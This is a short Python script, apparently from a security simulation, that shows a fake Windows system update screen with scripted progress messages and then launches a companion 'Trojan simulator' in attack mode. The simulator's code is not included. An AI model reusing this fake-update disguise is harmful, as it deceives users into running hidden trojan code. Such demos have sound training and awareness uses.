import os
import sys
import time

def setup():
    print("=========================================")
    print("   WINDOWS SYSTEM UPDATE v4.2.1          ")
    print("=========================================\n")
    
    print("[*] Downloading security patches...")
    time.sleep(1.5)
    print("[*] Unpacking libraries...")
    time.sleep(1)
    print("[*] Updating registry keys...")
    time.sleep(1)
    
    print("\n[+] Update successfully installed.")
    time.sleep(1)
    
    print("\n[!] Launching background services...\n")
    time.sleep(1)
    
    # Executes the Trojan simulator in ATTACK mode
    if sys.platform == "win32":
        os.system("python telemetry_simulator.py --attack")
    else:
        os.system("python3 telemetry_simulator.py --attack")

if __name__ == "__main__":
    setup()